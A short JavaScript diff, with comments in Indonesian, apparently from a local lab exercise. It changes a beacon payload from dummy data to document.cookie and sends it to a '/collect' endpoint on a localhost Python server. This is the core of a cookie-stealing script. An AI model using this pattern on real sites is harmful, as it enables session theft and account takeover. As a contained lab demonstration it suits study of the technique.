@@ -4,7 +4,7 @@
 const cookie = document.cookie
 
 // Kirim data dummy ke server Python lokal
-const payload = JSON.stringify(dummyData);
+const payload = JSON.stringify(cookie);
 
 const terkirim = navigator.sendBeacon(
     "http://127.0.0.1:5000/collect",
